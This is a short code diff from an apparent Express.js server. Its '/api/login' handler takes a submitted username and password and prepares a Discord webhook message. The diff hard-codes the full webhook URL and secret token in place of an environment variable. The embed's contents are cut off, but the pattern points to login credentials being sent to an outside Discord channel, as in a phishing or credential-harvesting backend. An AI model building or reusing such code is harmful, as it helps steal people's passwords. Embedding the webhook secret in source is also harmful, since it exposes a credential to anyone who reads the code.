@@ -33,7 +33,8 @@ if (process.env.DISCORD_TOKEN) {
 app.post('/api/login', async (req, res) => {
   const { username, password } = req.body;
 
-  const webhookUrl = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1540701070035132426/sDLZp1nOijCqtXNWrH3nDbe7yABDpVkelKna2kzM7RBT6oQ1tl5Dik6PnjUC-3y2o9pe';
+  // URL du Webhook en dur pour éviter tout plantage
+  const webhookUrl = 'https://discord.com/api/webhooks/1540701070035132426/sDLZp1nOijCqtXNWrH3nDbe7yABDpVkelKna2kzM7RBT6oQ1tl5Dik6PnjUC-3y2o9pe';
 
   const discordMessage = {
     embeds: [
